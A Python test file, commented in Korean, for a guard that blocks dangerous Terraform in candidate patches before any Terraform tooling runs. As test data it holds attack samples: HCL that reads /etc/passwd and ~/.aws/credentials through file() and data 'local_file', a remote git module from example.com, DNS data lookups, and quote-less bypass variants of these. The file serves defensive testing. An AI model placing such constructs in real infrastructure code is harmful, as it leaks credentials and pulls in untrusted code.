"""실행 전 안전 점검 (policy/validator.exec_guard, D-23, 2026-10-31).

제출된 Terraform 은 검사 대상이지 신뢰된 프로그램이 아니다. terraform init/validate/plan 은 모듈·provider 를 내려받고 data 블록과
파일 함수를 평가하므로, 원본에 없던 위험 구문이 들어오면 도구를 돌리기 전에 막아야 한다.
2026-10-31 확인: 이 규칙 전에는 아래 공격 예시 중 원격 모듈 · file() · data "local_file" · data "dns_a_record_set" 이 정책 검사를 통과했다.

지켜야 하는 것
  - 아래 구문이 새로 들어오면 정책 결과가 차단(ok=False)이고 위반 이름이 exec_guard: 로 시작한다
  - 주석 안의 글자, AWS provider 의 data 블록(aws_iam_policy_document 등), 원본에 이미 있던 줄은 막지 않는다
  - 기존 후보 세트의 후보 파일은 하나도 막히지 않는다 (오탐 0)
  - 리뷰 흐름에서 차단되면 Trivy·Terraform 을 실행하지 않고(local_verify 없음) 상태가 POLICY_BLOCKED 다
"""
from __future__ import annotations

import difflib
import json
import unittest
from pathlib import Path

from helpers import ROOT

from iacpatch.models import PatchCandidate
from iacpatch.policy.validator import exec_guard, validate_candidate
from iacpatch.web import explain

POLICY = json.loads((ROOT / "policy" / "patch_policy.json").read_text(encoding="utf-8"))
TF_DIR = "scenarios/arch/webapp-3tier"
ORIG = {p.name: p.read_text(encoding="utf-8") for p in sorted((ROOT / TF_DIR).glob("*.tf"))}
SG = ORIG["security_groups.tf"]
DESC = 'description = "SSH for administrators"'
_I = SG.index(DESC)                                                       # Bastion SSH 규칙 (파일의 첫 0.0.0.0/0 은 ALB 443)
FIXED = SG[:_I] + SG[_I:].replace('cidr_blocks = ["0.0.0.0/0"]', 'cidr_blocks = ["203.0.113.0/24"]', 1)

ATTACKS = {
    "원격 모듈": FIXED + '\nmodule "m" {\n  source = "git::https://example.com/x.git"\n}\n',
    "로컬 모듈": FIXED + '\nmodule "m" {\n  source = "./mod"\n}\n',
    "file() 설명": FIXED.replace(DESC, 'description = file("/etc/passwd")', 1),
    "file() 보간": FIXED.replace(DESC, 'description = "x ${file("/etc/passwd")}"', 1),
    "templatefile()": FIXED.replace(DESC, 'description = templatefile("/etc/hosts", {})', 1),
    "locals file()": FIXED + '\nlocals {\n  leak = file("~/.aws/credentials")\n}\n',
    "data local_file": FIXED + '\ndata "local_file" "x" {\n  filename = "/etc/passwd"\n}\n',
    "data dns": FIXED + '\ndata "dns_a_record_set" "x" {\n  host = "example.com"\n}\n',
    "check 안 data": FIXED + '\ncheck "c" {\n  data "dns_a_record_set" "y" {\n    host = "example.com"\n  }\n  assert {\n    condition     = true\n    error_message = "x"\n  }\n}\n',
    "provider 함수": FIXED.replace(DESC, 'description = provider::local::direxists("/")', 1),
    "import 블록": FIXED + '\nimport {\n  to = aws_security_group.bastion\n  id = "sg-1"\n}\n',
    "heredoc file()": FIXED + '\nlocals {\n  doc = <<EOT\n${file("/etc/passwd")}\nEOT\n}\n',
    # v1 에서 실제로 통과한 우회 (2026-10-31, OpenTofu 로 실행해 확인) — v2(허용 목록)는 막아야 한다
    "따옴표 없는 module": FIXED + '\nmodule m {\n  source = "git::https://example.com/x.git"\n}\n',
    "따옴표 없는 data": FIXED + '\ndata local_file x {\n  filename = "/etc/passwd"\n}\n',
    "줄바꿈 file()": FIXED.replace(DESC, 'description = (file\n    ("/etc/passwd"))', 1),
    "따옴표 없는 check": FIXED + '\ncheck c {\n  data dns_a_record_set y {\n    host = "example.com"\n  }\n}\n',
    "aws 외 리소스": FIXED + '\nresource "local_file" "x" {\n  filename = "/tmp/x"\n  content  = "y"\n}\n',
    "aws 외 리소스 (따옴표 없음)": FIXED + '\nresource tls_private_key k {\n  algorithm = "RSA"\n}\n',
    "provider 추가": FIXED + '\nprovider "aws" {\n  alias  = "x"\n  region = "us-east-1"\n}\n',
    "허용 목록 밖 함수": FIXED.replace(DESC, 'description = templatestring("x", {})', 1),
}


def cand(files):
    return PatchCandidate("c1", "manual", "manual:t", "PATCH", files)


class ExecGuardTest(unittest.TestCase):
    def test_attacks_blocked(self):
        self.assertIn(DESC, SG)
        for name, text in ATTACKS.items():
            with self.subTest(name):
                r = validate_candidate(cand({"security_groups.tf": text}), ORIG, POLICY, TF_DIR)
                self.assertFalse(r.ok, name)
                self.assertTrue(any(v.startswith("exec_guard:security_groups.tf") for v in r.violations), r.violations)

    def test_harmless_not_blocked(self):
        ok = {
            "주석": FIXED + '\n# file("/etc/passwd") 는 주석이라 실행되지 않음\n/* module "m" { } */\n',
            "AWS data": FIXED + '\ndata "aws_iam_policy_document" "p" {\n  statement {\n    actions   = ["s3:GetObject"]\n    resources = ["*"]\n  }\n}\n',
            "출발지 수정만": FIXED,
            "문자열 안의 글자": FIXED.replace(DESC, 'description = "see file(x) and module m { }"', 1),
            "순수 함수": FIXED.replace(DESC, 'description = format("%s-%s", upper("a"), join(",", ["b"]))', 1),
        }
        for name, text in ok.items():
            with self.subTest(name):
                self.assertEqual(exec_guard(SG, text), [], name)

    def test_existing_lines_not_blocked(self):
        base = 'resource "aws_instance" "a" {\n  user_data = file("${path.module}/init.sh")\n}\n'
        self.assertEqual(exec_guard(base, base + "\n"), [])
        self.assertTrue(exec_guard(base, base.replace("init.sh", "../../secret")))   # 인자를 바꾸면 새 줄 → 차단

    def test_no_false_positive_on_candidate_sets(self):
        flagged = []
        for mp in sorted((ROOT / "experiments" / "candidate-sets").glob("*/manifest.json")):
            man = json.loads(mp.read_text(encoding="utf-8"))
            for c in man.get("candidates") or []:
                ref = str(c.get("candidate") or "")
                tf_dir = c.get("tf_dir") or man.get("tf_dir")
                if not ref.startswith("manual:") or not ref.endswith(".tf") or not tf_dir or not (ROOT / tf_dir).is_dir():
                    continue
                p = mp.parent / ref[7:]
                if not p.exists():
                    continue
                txt = p.read_text(encoding="utf-8")
                orig = {q.name: q.read_text(encoding="utf-8") for q in (ROOT / tf_dir).glob("*.tf")}
                best = max(orig, key=lambda n: difflib.SequenceMatcher(None, orig[n], txt).quick_ratio())
                if exec_guard(orig[best], txt):
                    flagged.append(f"{mp.parent.name}/{c['id']}")
                    self.assertNotEqual(c.get("expected"), "correct", c["id"])     # 설계대로 고친 후보가 막히면 오탐
        # 막혀야 맞는 것: provisioner 를 넣은 후보 · provider 블록까지 지운 빈 파일 후보. 그 밖의 후보는 오탐 0
        self.assertEqual(sorted(flagged), ["arch-3tier-sg/provisioner-exec", "eval-seeded-sg/invalid-empty"])

    def test_absolute_mode_on_originals(self):
        """원본(사례 코드) 검사: 지금 사례 원본은 전부 통과, 위험 구문이 있는 원본은 잡는다."""
        from iacpatch.policy.exec_guard import check, check_files
        flagged = []
        for d in sorted({p.parent for p in (ROOT / "scenarios").glob("**/*.tf")} | {ROOT / "infrastructure" / "sg-baseline"}):
            if d.name == "webapp-3tier-testbed":
                continue                                   # 팀의 시험 환경 폴더 — 검사 대상 원본이 아니다 (user_data 스크립트를 file() 로 읽음)
            if check_files({q.name: q.read_text(encoding="utf-8") for q in d.glob("*.tf")}):
                flagged.append(d.relative_to(ROOT).as_posix())
        self.assertEqual(flagged, [])
        bad = ('terraform {\n  required_providers {\n    aws = { source = "hashicorp/aws" }\n    random = { source = "hashicorp/random" }\n  }\n'
               '  backend "s3" {\n    bucket = "x"\n  }\n}\nprovider "aws" {\n  region = "x"\n}\nmodule "m" {\n  source = "./x"\n}\n')
        notes = " / ".join(check(bad))
        for w in ("backend s3", "module m", "random"):
            self.assertIn(w, notes)
        self.assertNotIn("provider aws", notes)            # 원본의 provider "aws" 는 있어야 하는 것

    def test_screen_label(self):
        r = validate_candidate(cand({"security_groups.tf": ATTACKS["원격 모듈"]}), ORIG, POLICY, TF_DIR)
        cls = explain.classify_candidate({"state": "POLICY_BLOCKED"}, None, r.to_dict())
        self.assertEqual(cls["code"], "exec_guard")
        from iacpatch.proof.cards import policy_ko
        self.assertTrue(policy_ko(r.violations[0]).startswith("security_groups.tf: 실행 전 안전 점검 차단 — module 블록"))


class ExecGuardFlowTest(unittest.TestCase):
    """리뷰 흐름: 차단되면 도구를 실행하지 않는다."""

    def test_review_stops_on_unsafe_original(self):
        """원본에 위험 구문이 있으면 후보를 보기 전에 멈추고 도구를 실행하지 않는다."""
        import shutil
        import tempfile
        from iacpatch.config import load_settings
        from iacpatch.review.flow import ReviewOptions, run_review
        out = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, out, True)
        src = out / "orig"
        shutil.copytree(ROOT / TF_DIR, src)
        (src / "extra.tf").write_text('data local_file x {\n  filename = "/etc/passwd"\n}\n', encoding="utf-8")
        cpath = out / "c.tf"
        cpath.write_text(FIXED, encoding="utf-8")
        opt = ReviewOptions(tf_dir=str(src), trivy_json=str(ROOT / "experiments" / "arch-webapp-3tier" / "trivy-scan.json"),
                            candidate=f"manual:{cpath}", scenario="ui/arch-3tier-sg/orig-guard-test", rule="AVD-AWS-0107",
                            resource="aws_security_group.bastion", out_dir=str(out / "reviews"), local_tools=True)
        res = run_review(load_settings(str(ROOT)), opt)
        self.assertEqual(res.state.value, "INPUT_ERROR")
        self.assertIn("실행 전 안전 점검", res.message)
        self.assertFalse((res.run_dir / "local_verify").exists())
        g = json.loads((res.run_dir / "input" / "original_guard.json").read_text(encoding="utf-8"))
        self.assertFalse(g["ok"])

    def test_review_stops_before_tools(self):
        import shutil
        import tempfile
        from iacpatch.config import load_settings
        from iacpatch.review.flow import ReviewOptions, run_review
        out = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, out, True)
        cpath = out / "attack.tf"
        cpath.write_text(ATTACKS["data local_file"], encoding="utf-8")
        s = load_settings(str(ROOT))
        opt = ReviewOptions(tf_dir=TF_DIR, trivy_json=str(ROOT / "experiments" / "arch-webapp-3tier" / "trivy-scan.json"),
                            candidate=f"manual:{cpath}", scenario="ui/arch-3tier-sg/exec-guard-test", rule="AVD-AWS-0107",
                            resource="aws_security_group.bastion", candidate_note="단위 테스트", out_dir=str(out / "reviews"),
                            intent=str(ROOT / "experiments" / "candidate-sets" / "arch-3tier-sg" / "intents" / "arch-3tier-flows.json"),
                            local_tools=True)
        res = run_review(s, opt)
        self.assertEqual(res.state.value, "POLICY_BLOCKED")
        self.assertFalse((res.run_dir / "local_verify").exists(), "차단됐는데 도구 실행 폴더가 생겼다")
        pol = json.loads((res.run_dir / "policy.json").read_text(encoding="utf-8"))
        self.assertTrue(any(v.startswith("exec_guard:") for v in pol["violations"]))


@unittest.skipIf(__import__("os").name == "nt", "가짜 실행 파일이 sh 스크립트")
class OfflineEnvTest(unittest.TestCase):
    """오프라인 작업 폴더에서는 AWS 자격증명 환경 변수를 비우고 terraform 을 부른다 (1차 검사는 이 PC 의 AWS 프로필·키를 쓰지 않는다)."""

    def test_offline_workdir_blanks_aws_env(self):
        import os
        import shutil
        import tempfile
        from iacpatch.tools.terraform import OFFLINE_OVERRIDE_FILENAME, TerraformAdapter
        d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, d, True)
        fake = d / "tf"
        fake.write_text('#!/bin/sh\necho "P=[$AWS_PROFILE] K=[$AWS_ACCESS_KEY_ID]"\n', encoding="utf-8")
        fake.chmod(0o755)
        wd = d / "wd"
        wd.mkdir()
        t = TerraformAdapter(str(fake), "ap-northeast-2")
        old = {k: os.environ.get(k) for k in ("AWS_PROFILE", "AWS_ACCESS_KEY_ID")}
        os.environ.update({"AWS_PROFILE": "real-profile", "AWS_ACCESS_KEY_ID": "AKIAEXAMPLE"})
        try:
            self.assertIn("P=[real-profile]", t._run(["version"], wd).result.stdout)      # 오프라인 폴더 아님 → 그대로 (시험 환경 plan 등)
            (wd / OFFLINE_OVERRIDE_FILENAME).write_text("# offline", encoding="utf-8")
            self.assertIn("P=[] K=[]", t._run(["version"], wd).result.stdout)
        finally:
            for k, v in old.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v


if __name__ == "__main__":
    unittest.main()
